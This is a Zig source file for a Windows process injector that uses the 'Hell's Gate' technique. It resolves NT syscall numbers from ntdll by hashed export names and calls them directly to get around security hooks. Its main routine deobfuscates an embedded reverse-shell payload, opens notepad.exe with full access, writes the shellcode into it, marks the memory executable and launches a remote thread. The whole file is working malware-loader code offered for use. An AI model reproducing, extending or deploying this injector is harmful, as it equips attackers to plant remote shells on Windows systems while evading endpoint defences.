const std = @import("std");
const payloads = @import("payloads.zig");
const print = std.debug.print;
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

const target_process = "notepad.exe";

// Windows types and constants
pub const HANDLE = windows.HANDLE;
pub const DWORD = windows.DWORD;
pub const ULONG = windows.ULONG;
pub const PVOID = windows.PVOID;
pub const LPVOID = windows.LPVOID;
pub const BYTE = windows.BYTE;
pub const PBYTE = [*]u8;
pub const BOOL = windows.BOOL;
pub const NTSTATUS = windows.NTSTATUS;
pub const SIZE_T = usize;
pub const WORD = u16;
pub const PWORD = *u16;
pub const PDWORD = *DWORD;

// Constants for Hell's Gate
pub const MEM_RESERVE = windows.MEM_RESERVE;
pub const MEM_COMMIT = windows.MEM_COMMIT;
pub const PAGE_READWRITE = windows.PAGE_READWRITE;
pub const PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE;
pub const THREAD_ALL_ACCESS = 0x1FFFFF;
pub const PROCESS_ALL_ACCESS = 0x001FFFFF;
pub const FALSE = windows.FALSE;
const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
const INVALID_HANDLE_VALUE: HANDLE = @as(HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));
const MAX_PATH: usize = 260;

// Syscall hashes (djb2)
const NtAllocateVirtualMemory_djb2: u64 = 0x2D6D94ABE5CBF5F6;
const NtWriteVirtualMemory_djb2: u64 = 0xF5E50822A1E6CA7C;
const NtProtectVirtualMemory_djb2: u64 = 0x68340BF4DD70E832;
const NtCreateThreadEx_djb2: u64 = 0xD6BC9C637D9E5F1A;

// Global assembly - Hell's Gate implementation
// Zig only support AT&T syntax due to LLVM for now
// -----------------------------------------------
// Zig will export those function to be call at compile time
comptime {
    asm (
        \\.data
        \\w_system_call: .long 0
        \\
        \\.text
        \\.globl hells_gate
        \\hells_gate:
        \\    movl $0, w_system_call(%rip)
        \\    movl %ecx, w_system_call(%rip)
        \\    ret
        \\
        \\.globl hell_descent
        \\hell_descent:
        \\    mov %rcx, %r10
        \\    movl w_system_call(%rip), %eax
        \\    syscall
        \\    ret
    );
}

// External function declarations for the global assembly
pub extern fn hells_gate(syscall_number: DWORD) void;
pub extern fn hell_descent(arg1: usize, arg2: usize, arg3: usize, arg4: usize, arg5: usize, arg6: usize, arg7: usize, arg8: usize, arg9: usize, arg10: usize, arg11: usize) callconv(.C) NTSTATUS;

// const HellsGateFn = fn (syscall_id: u32) callconv(.C) void;
// const HellDescentFn = fn () callconv(.C) void;

// Structures for Hell's Gate
pub const VxTableEntry = extern struct {
    addr_ptr: ?PVOID,
    hash: u64,
    system_call: WORD,
};

pub const VxTable = extern struct {
    NtAllocateVirtualMemory: VxTableEntry,
    NtWriteVirtualMemory: VxTableEntry,
    NtProtectVirtualMemory: VxTableEntry,
    NtCreateThreadEx: VxTableEntry,
};

// PE structures for parsing NTDLL
// IMAGE_DOS_HEADER in Windows
const ImageDosHeader = extern struct {
    e_magic: WORD,
    e_cblp: WORD,
    e_cp: WORD,
    e_crlc: WORD,
    e_cparhdr: WORD,
    e_minalloc: WORD,
    e_maxalloc: WORD,
    e_ss: WORD,
    e_sp: WORD,
    e_csum: WORD,
    e_ip: WORD,
    e_cs: WORD,
    e_lfarlc: WORD,
    e_ovno: WORD,
    e_res: [4]WORD,
    e_oemid: WORD,
    e_oeminfo: WORD,
    e_res2: [10]WORD,
    e_lfanew: i32,
};

// IMAGE_FILE_HEADER in Windows
const ImageFileHeader = extern struct {
    Machine: WORD,
    NumberOfSections: WORD,
    TimeDateStamp: DWORD,
    PointerToSymbolTable: DWORD,
    NumberOfSymbols: DWORD,
    SizeOfOptionalHeader: WORD,
    Characteristics: WORD,
};

// IMAGE_DATA_DIRECTORY in Windows
const ImageDataDirectory = extern struct {
    VirtualAddress: DWORD,
    Size: DWORD,
};

// IMAGE_OPTIONAL_HEADER64 in Windows
const ImageOptionalHeader64 = extern struct {
    MajorLinkerVersion: BYTE,
    MinorLinkerVersion: BYTE,
    SizeOfCode: DWORD,
    SizeOfInitializedData: DWORD,
    AddressOfEntryPoint: DWORD,
    BaseOfCode: DWORD,
    ImageBase: u64,
    SectionAlignment: DWORD,
    MajorOperatingSystemVersion: WORD,
    MinorOperatingSystemVersion: WORD,
    MajorImageVersion: WORD,
    MinorImageVersion: WORD,
    MajorSubsystemVersion: WORD,
    MinorSubsystemVersion: WORD,
    Win32VersionValue: DWORD,
    SizeOfImage: DWORD,
    SizeOfHeaders: DWORD,
    CheckSum: DWORD,
    Subsystem: WORD,
    DllCharacteristics: WORD,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: DWORD,
    NumberOfRvaAndSizes: DWORD,
    DataDirectory: [16]ImageDataDirectory,
};

// IMAGE_NT_HEADERS64 in Windows
const ImageNtHeaders64 = extern struct {
    Signature: DWORD,
    FileHeader: ImageFileHeader,
    OptionalHeader: ImageOptionalHeader64,
};

// IMAGE_EXPORT_DIRECTORY in Windows
const ImageExportDirectory = extern struct {
    Characteristics: DWORD,
    TimeDateStamp: DWORD,
    MajorVersion: WORD,
    MinorVersion: WORD,
    Name: DWORD,
    Base: DWORD,
    NumberOfFunctions: DWORD,
    NumberOfNames: DWORD,
    AddressOfFunctions: DWORD,
    AddressOfNames: DWORD,
    AddressOfNameOrdinals: DWORD,
};

// TEB and PEB structures (simplified)
const ListEntry = extern struct {
    Flink: *ListEntry,
    Blink: *ListEntry,
};

// UNICODE_STRING in Windows
const UnicodeString = extern struct {
    Length: u16,
    MaximumLength: u16,
    Buffer: [*:0]u16,
};

// LDR_DATA_TABLE_ENTRY in Windows
const LdrDataTableEntry = extern struct {
    InLoadOrderLinks: ListEntry,
    InMemoryOrderLinks: ListEntry,
    InInitializationOrderLinks: ListEntry,
    DllBase: PVOID,
    EntryPoint: PVOID,
    SizeOfImage: ULONG,
    FullDllName: UnicodeString,
    BaseDllName: UnicodeString,
    Flags: ULONG,
    LoadCount: WORD,
    TlsIndex: WORD,
    // ... rest of the structure (simplified for our needs)
};

// PEB_LDR_DATA
const PebLdrData = extern struct {
    Length: ULONG,
    Initialized: ULONG,
    SsHandle: PVOID,
    InLoadOrderModuleList: ListEntry,
    InMemoryOrderModuleList: ListEntry,
    InInitializationOrderModuleList: ListEntry,
};

// PEB
const PEB = extern struct {
    InheritedAddressSpace: BYTE,
    ReadImageFileExecOptions: BYTE,
    BeingDebugged: BYTE,
    BitField: BYTE,
    Mutant: HANDLE,
    ImageBaseAddress: PVOID,
    LoaderData: *PebLdrData,
    ProcessParameters: PVOID,
    SubSystemData: PVOID,
    ProcessHeap: PVOID,
    FastPebLock: PVOID,
    FastPebLockRoutine: PVOID,
    FastPebUnlockRoutine: PVOID,
    EnvironmentUpdateCount: ULONG,
    KernelCallbackTable: ?*anyopaque,
    EventLogSection: PVOID,
    EventLog: PVOID,
    FreeList: PVOID,
    TlsExpansionCounter: ULONG,
    TlsBitmap: PVOID,
    TlsBitmapBits: [2]ULONG,
    ReadOnlySharedMemoryBase: PVOID,
    ReadOnlySharedMemoryHeap: PVOID,
    ReadOnlyStaticServerData: ?*anyopaque,
    AnsiCodePageData: PVOID,
    OemCodePageData: PVOID,
    UnicodeCaseTableData: PVOID,
    NumberOfProcessors: ULONG,
    NtGlobalFlag: ULONG,
    reserved: [4]BYTE,
    CriticalSectionTimeout: i64,
    HeapSegmentReserve: ULONG,
    HeapSegmentCommit: ULONG,
    HeapDeCommitTotalFreeThreshold: ULONG,
    HeapDeCommitFreeBlockThreshold: ULONG,
    NumberOfHeaps: ULONG,
    MaximumNumberOfHeaps: ULONG,
    ProcessHeaps: ?*anyopaque,
    GdiSharedHandleTable: PVOID,
    ProcessStarterHelper: PVOID,
    GdiDCAttributeList: PVOID,
    LoaderLock: PVOID,
    OSMajorVersion: ULONG,
    OSMinorVersion: ULONG,
    OSBuildNumber: ULONG,
    OSPlatformId: ULONG,
    ImageSubSystem: ULONG,
    ImageSubSystemMajorVersion: ULONG,
    ImageSubSystemMinorVersion: ULONG,
    // ... more fields would be here in full structure
};

// TEB
const TEB = extern struct {
    NtTib: windows.NT_TIB,
    EnvironmentPointer: PVOID,
    ClientId: windows.CLIENT_ID,
    ActiveRpcHandle: PVOID,
    ThreadLocalStoragePointer: PVOID,
    ProcessEnvironmentBlock: *PEB,
    // ... rest omitted for brevity
};

// PROCESSENTRY32W structure
const PROCESSENTRY32W = extern struct {
    dwSize: DWORD,
    cntUsage: DWORD,
    th32ProcessID: DWORD,
    th32DefaultHeapID: usize, // ULONG_PTR
    th32ModuleID: DWORD,
    cntThreads: DWORD,
    th32ParentProcessID: DWORD,
    pcPriClassBase: i32, // LONG
    dwFlags: DWORD,
    szExeFile: [MAX_PATH]u16, // WCHAR[MAX_PATH]
};

// External functions
extern "kernel32" fn GetCurrentThreadId() callconv(WINAPI) DWORD;
extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;
extern "kernel32" fn GetCurrentProcess() callconv(WINAPI) HANDLE;
extern "kernel32" fn GetThreadId(Thread: HANDLE) callconv(WINAPI) DWORD;
extern "kernel32" fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) callconv(WINAPI) HANDLE;
extern "kernel32" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;
extern "kernel32" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;

// Helper function to convert UTF-8 string to UTF-16 (wide string)
fn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![]u16 {
    const utf16_len = try std.unicode.calcUtf16LeLen(utf8_str);
    var wide_string = try allocator.alloc(u16, utf16_len + 1);

    _ = try std.unicode.utf8ToUtf16Le(wide_string[0..utf16_len], utf8_str);
    wide_string[utf16_len] = 0; // Null terminate

    return wide_string;
}

// Helper function to compare wide strings (case-insensitive)
fn compareWideStringsIgnoreCase(str1: []const u16, str2: []const u16) bool {
    if (str1.len != str2.len) return false;

    for (str1, str2) |c1, c2| {
        // Simple case-insensitive comparison for ASCII range
        const lower_c1 = if (c1 >= 'A' and c1 <= 'Z') c1 + 32 else c1;
        const lower_c2 = if (c2 >= 'A' and c2 <= 'Z') c2 + 32 else c2;
        if (lower_c1 != lower_c2) return false;
    }
    return true;
}

fn getRemoteProcessPid(allocator: std.mem.Allocator, process_name: []const u8) !DWORD {
    const wide_process_name = try convertToWideString(allocator, process_name);
    defer allocator.free(wide_process_name);

    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return error.SnapshotFailed;
    }
    defer _ = CloseHandle(snapshot);

    var process_entry = std.mem.zeroes(PROCESSENTRY32W);
    process_entry.dwSize = @sizeOf(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &process_entry) == 0) {
        return error.ProcessEnumFailed;
    }

    while (true) {
        // Find the length of the executable name (null-terminated)
        var exe_name_len: usize = 0;
        while (exe_name_len < process_entry.szExeFile.len and process_entry.szExeFile[exe_name_len] != 0) {
            exe_name_len += 1;
        }

        const exe_name = process_entry.szExeFile[0..exe_name_len];

        // Compare process names (case-insensitive)
        if (compareWideStringsIgnoreCase(exe_name, wide_process_name[0 .. wide_process_name.len - 1])) { // -1 to exclude null terminator
            return process_entry.th32ProcessID;
        }

        if (Process32NextW(snapshot, &process_entry) == 0) {
            break;
        }
    }

    std.debug.print("{s}", .{process_name});
    return error.ProcessNotFound;
}

fn rtlGetThreadEnvironmentBlock() *TEB {
    // x86_64
    if (@import("builtin").target.cpu.arch == .x86_64) {
        return @ptrFromInt(@as(usize, asm volatile ("mov %%gs:0x30, %[ret]"
            : [ret] "=r" (-> usize),
        )));
    }
    // x86
    else {
        return @ptrFromInt(@as(usize, asm volatile ("mov %%fs:0x18, %[ret]"
            : [ret] "=r" (-> usize),
        )));
    }
}

// djb2 hash function
// `[*:0]const u8` is a null-terminated string
fn djb2(str: [*:0]const u8) u64 {
    // var hash: u64 = 0x77347734DEADBEEF; // customized seed
    var hash: u64 = 0xCAFEBABE1337BEEF; // customized seed
    var i: usize = 0;

    while (str[i] != 0) : (i += 1) {
        // Use correct Zig 0.14.1 wrapping arithmetic syntax
        hash = hash *% 33 +% str[i];
    }

    return hash;
}

// Get export directory from PE
fn getImageExportDirectory(moduleBase: PVOID) ?*ImageExportDirectory {
    const dosHeader = @as(*ImageDosHeader, @ptrCast(@alignCast(moduleBase)));
    if (dosHeader.e_magic != 0x5A4D) { // "MZ"
        return null;
    }

    const ntHeaders = @as(*ImageNtHeaders64, @ptrCast(@alignCast(@as([*]u8, @ptrCast(moduleBase)) + @as(usize, @intCast(dosHeader.e_lfanew)))));
    if (ntHeaders.Signature != 0x00004550) { // "PE\0\0"
        return null;
    }

    const exportRva = ntHeaders.OptionalHeader.DataDirectory[0].VirtualAddress;
    if (exportRva == 0) {
        return null;
    }

    return @as(*ImageExportDirectory, @ptrCast(@alignCast(@as([*]u8, @ptrCast(moduleBase)) + exportRva)));
}

// Get VX table entry
fn getVxTableEntry(moduleBase: PVOID, exportDir: *ImageExportDirectory, entry: *VxTableEntry) bool {
    const baseAddr = @as([*]u8, @ptrCast(moduleBase));

    const addressOfFunctions = @as([*]DWORD, @ptrCast(@alignCast(baseAddr + exportDir.AddressOfFunctions)));
    const addressOfNames = @as([*]DWORD, @ptrCast(@alignCast(baseAddr + exportDir.AddressOfNames)));
    const addressOfNameOrdinals = @as([*]WORD, @ptrCast(@alignCast(baseAddr + exportDir.AddressOfNameOrdinals)));

    var cx: WORD = 0;
    while (cx < exportDir.NumberOfNames) : (cx += 1) {
        const functionName = @as([*:0]u8, @ptrCast(baseAddr + addressOfNames[cx]));
        const functionAddress = baseAddr + addressOfFunctions[addressOfNameOrdinals[cx]];

        if (djb2(functionName) == entry.hash) {
            entry.addr_ptr = functionAddress;

            // Parse syscall number from function prologue
            var cw: WORD = 0;
            while (cw < 32) : (cw += 1) { // Search within first 32 bytes
                const funcBytes = @as([*]u8, @ptrCast(functionAddress));

                // Check for syscall instruction (0x0f 0x05) - we've gone too far
                if (funcBytes[cw] == 0x0f and funcBytes[cw + 1] == 0x05) {
                    return false;
                }

                // Check for ret instruction (0xc3) - also too far
                if (funcBytes[cw] == 0xc3) {
                    return false;
                }

                // Look for pattern: MOV R10, RCX; MOV EAX, <syscall_number>
                // 4C 8B D1 B8 XX XX 00 00
                if (funcBytes[cw] == 0x4c and
                    funcBytes[cw + 1] == 0x8b and
                    funcBytes[cw + 2] == 0xd1 and
                    funcBytes[cw + 3] == 0xb8 and
                    funcBytes[cw + 6] == 0x00 and
                    funcBytes[cw + 7] == 0x00)
                {
                    const high = funcBytes[cw + 5];
                    const low = funcBytes[cw + 4];
                    entry.system_call = (@as(WORD, high) << 8) | low;
                    return true;
                }
            }
        }
    }

    return false;
}

// Initialize Hell's Gate VX table
pub fn init_vx_table() ?VxTable {
    const currentTeb = rtlGetThreadEnvironmentBlock();
    const currentPeb = currentTeb.ProcessEnvironmentBlock;

    // Check if we're on Windows 10 (major version 0xA)
    if (currentPeb.OSMajorVersion != 0xA) {
        print("[-] Hell's Gate requires Windows 10\n", .{});
        return null;
    }

    // Get NTDLL module from PEB
    const ldrData = currentPeb.LoaderData;

    // Get the second entry in InMemoryOrderModuleList (which is NTDLL)
    const secondLink = ldrData.InMemoryOrderModuleList.Flink.Flink;
    const firstEntry = @as(*LdrDataTableEntry, @ptrFromInt(@intFromPtr(secondLink) - @offsetOf(LdrDataTableEntry, "InMemoryOrderLinks")));

    // Get export directory
    const exportDir = getImageExportDirectory(firstEntry.DllBase) orelse {
        print("[-] Failed to get export directory\n", .{});
        return null;
    };

    // Initialize VX table
    var table = VxTable{
        .NtAllocateVirtualMemory = VxTableEntry{
            .addr_ptr = @ptrFromInt(0),
            .hash = NtAllocateVirtualMemory_djb2,
            .system_call = 0,
        },
        .NtWriteVirtualMemory = VxTableEntry{
            .addr_ptr = @ptrFromInt(0),
            .hash = NtWriteVirtualMemory_djb2,
            .system_call = 0,
        },
        .NtProtectVirtualMemory = VxTableEntry{
            .addr_ptr = @ptrFromInt(0),
            .hash = NtProtectVirtualMemory_djb2,
            .system_call = 0,
        },
        .NtCreateThreadEx = VxTableEntry{
            .addr_ptr = @ptrFromInt(0),
            .hash = NtCreateThreadEx_djb2,
            .system_call = 0,
        },
    };

    // Populate table entries
    if (!getVxTableEntry(firstEntry.DllBase, exportDir, &table.NtAllocateVirtualMemory) or
        !getVxTableEntry(firstEntry.DllBase, exportDir, &table.NtWriteVirtualMemory) or
        !getVxTableEntry(firstEntry.DllBase, exportDir, &table.NtProtectVirtualMemory) or
        !getVxTableEntry(firstEntry.DllBase, exportDir, &table.NtCreateThreadEx))
    {
        print("[-] Failed to resolve all syscalls\n", .{});
        return null;
    }

    print("[+] Hell's Gate VX table initialized successfully\n", .{});
    print("[+] NtAllocateVirtualMemory syscall: {d}\n", .{table.NtAllocateVirtualMemory.system_call});
    print("[+] NtWriteVirtualMemory syscall: {d}\n", .{table.NtWriteVirtualMemory.system_call});
    print("[+] NtProtectVirtualMemory syscall: {d}\n", .{table.NtProtectVirtualMemory.system_call});
    print("[+] NtCreateThreadEx syscall: {d}\n", .{table.NtCreateThreadEx.system_call});

    return table;
}

// Classic injection using Hell's Gate syscalls
// pub fn hellsGateInject(vx_table: *VX_TABLE, processHandle: HANDLE, payload: [*]const u8, payloadSize: SIZE_T) bool {
//     const success = NTSTATUS.SUCCESS;
//     var status: NTSTATUS = success;
//     var address: ?PVOID = @ptrFromInt(0);
//     var oldProtection: ULONG = 0;
//     var size: SIZE_T = payloadSize;
//     var bytesWritten: SIZE_T = 0;
//     var threadHandle: HANDLE = undefined;
//
//     print("[*] Starting Hell's Gate injection...\n", .{});
//
//     // Step 1: Allocate memory using Hell's Gate
//     hells_gate(vx_table.NtAllocateVirtualMemory.system_call);
//     status = hell_descent(@intFromPtr(processHandle), @intFromPtr(&address), 0, @intFromPtr(&size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0, 0, 0, 0, 0);
//
//     if (status != success) {
//         print("[!] NtAllocateVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
//         return false;
//     }
//     print("[+] Allocated address at: 0x{X} of size: {d}\n", .{ @intFromPtr(address), size });
//
//     // Step 2: Write payload using Hell's Gate
//     print("[*] Writing payload of size {d}...\n", .{payloadSize});
//     hells_gate(vx_table.NtWriteVirtualMemory.system_call);
//     status = hell_descent(@intFromPtr(processHandle), @intFromPtr(address), @intFromPtr(payload), payloadSize, @intFromPtr(&bytesWritten), 0, 0, 0, 0, 0, 0);
//
//     if (status != success or bytesWritten != payloadSize) {
//         print("[!] NtWriteVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
//         print("[!] Bytes written: {d} of {d}\n", .{ bytesWritten, payloadSize });
//         return false;
//     }
//     print("[+] Payload written successfully\n", .{});
//
//     // Step 3: Change memory protection to executable using Hell's Gate
//     hells_gate(vx_table.NtProtectVirtualMemory.system_call);
//     status = hell_descent(@intFromPtr(processHandle), @intFromPtr(&address), @intFromPtr(&payloadSize), PAGE_EXECUTE_READWRITE, @intFromPtr(&oldProtection), 0, 0, 0, 0, 0, 0);
//
//     if (status != success) {
//         print("[!] NtProtectVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
//         return false;
//     }
//     print("[+] Memory protection changed to executable\n", .{});
//
//     // Step 4: Create and execute thread using Hell's Gate
//     print("[*] Creating thread at entry point 0x{X}...\n", .{@intFromPtr(address)});
//     hells_gate(vx_table.NtCreateThreadEx.system_call);
//     status = hell_descent(@intFromPtr(&threadHandle), THREAD_ALL_ACCESS, 0, // NULL object attributes
//         @intFromPtr(processHandle), @intFromPtr(address), 0, // NULL parameter
//         0, // Create flags
//         0, // Stack zero bits
//         0, // Size of stack commit
//         0, // Size of stack reserve
//         0 // Bytes buffer
//     );
//
//     if (status != success) {
//         print("[!] NtCreateThreadEx failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
//         return false;
//     }
//
//     print("[+] Thread created successfully with handle: 0x{X}\n", .{@intFromPtr(threadHandle)});
//     print("[+] Hell's Gate injection completed successfully!\n", .{});
//
//     return true;
// }

fn classicInjectionViaSyscalls(vx_table: *VxTable, process_handle: HANDLE, payload: [*]const u8, payload_size: SIZE_T) bool {
    const nt_success = NTSTATUS.SUCCESS;
    var status: NTSTATUS = nt_success;
    var address: ?PVOID = @ptrFromInt(0);
    var old_protection: ULONG = 0;
    var size: SIZE_T = payload_size;
    var bytes_written: SIZE_T = 0;
    var thread_handle: HANDLE = undefined;

    // Step 1: Allocate memory using Hell's Gate
    hells_gate(vx_table.NtAllocateVirtualMemory.system_call);
    status = hell_descent(@intFromPtr(process_handle), @intFromPtr(&address), 0, @intFromPtr(&size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0, 0, 0, 0, 0);

    if (status != nt_success) {
        print("[!] NtAllocateVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
        return false;
    }
    print("[+] Allocated Address At : 0x{X} Of Size : {d}\n", .{ @intFromPtr(address), size });

    // Step 2: Write the payload
    print("\t[i] Writing Payload Of Size {d} ... ", .{payload_size});
    hells_gate(vx_table.NtWriteVirtualMemory.system_call);
    status = hell_descent(@intFromPtr(process_handle), @intFromPtr(address), @intFromPtr(payload), payload_size, @intFromPtr(&bytes_written), 0, 0, 0, 0, 0, 0);

    if (status != nt_success or bytes_written != payload_size) {
        print("[!] NtWriteVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
        print("[i] Bytes Written : {d} of {d}\n", .{ bytes_written, payload_size });
        return false;
    }
    print("[+] DONE\n", .{});

    // Step 3: Change memory protection to executable
    hells_gate(vx_table.NtProtectVirtualMemory.system_call);
    status = hell_descent(@intFromPtr(process_handle), @intFromPtr(&address), @intFromPtr(&payload_size), PAGE_EXECUTE_READWRITE, @intFromPtr(&old_protection), 0, 0, 0, 0, 0, 0);

    if (status != nt_success) {
        print("[!] NtProtectVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
        return false;
    }

    // Step 4: Execute the payload via thread
    print("\t[i] Running Thread Of Entry 0x{X} ... ", .{@intFromPtr(address)});
    hells_gate(vx_table.NtCreateThreadEx.system_call);
    status = hell_descent(@intFromPtr(&thread_handle), THREAD_ALL_ACCESS, 0, // NULL object attributes
        @intFromPtr(process_handle), @intFromPtr(address), 0, // NULL parameter
        0, // Create flags
        0, // Stack zero bits
        0, // Size of stack commit
        0, // Size of stack reserve
        0 // Bytes buffer
    );

    if (status != nt_success) {
        print("[!] NtCreateThreadEx Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
        return false;
    }
    print("[+] DONE\n", .{});
    print("\t[+] Thread Created With Id : {d}\n", .{GetThreadId(thread_handle)});

    return true;
}

/// Check if Hell's Gate technique is available on current system
pub fn isAvailable() bool {
    const currentTeb = rtlGetThreadEnvironmentBlock();
    const currentPeb = currentTeb.ProcessEnvironmentBlock;
    return currentPeb.OSMajorVersion == 0xA;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shellcode = try payloads.macDeobfuscation(&payloads.revshell, allocator);
    defer allocator.free(shellcode);

    print("[*] hell's gate process injection\n", .{});

    // Check if Hell's Gate is available
    if (!isAvailable()) {
        print("[-] Hell's Gate technique not available (requires Windows 10)\n", .{});
        std.process.exit(1);
    }

    // Initialize VX table
    var vx_table = init_vx_table() orelse {
        print("[-] Failed to initialize Hell's Gate VX table\n", .{});
        std.process.exit(1);
    };

    print("\n[*] VX Table initialized successfully\n", .{});
    print("[*] Payload size: {d} bytes\n", .{shellcode.len});
    var success = false;

    const target_pid = try getRemoteProcessPid(allocator, target_process);

    print("[i] Targeting process of id : {d}\n", .{target_pid});
    const target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid) orelse {
        print("[!] OpenProcess Failed With Error : {d}\n", .{GetLastError()});
        std.process.exit(1);
    };
    defer _ = CloseHandle(target_process_handle);

    print("[*] Performing REMOTE injection\n", .{});
    success = classicInjectionViaSyscalls(&vx_table, target_process_handle, shellcode.ptr, shellcode.len);

    if (success) {
        print("\n[+] Injection completed successfully!\n", .{});
    } else {
        print("\n[-] Injection failed!\n", .{});
        std.process.exit(1);
    }
}
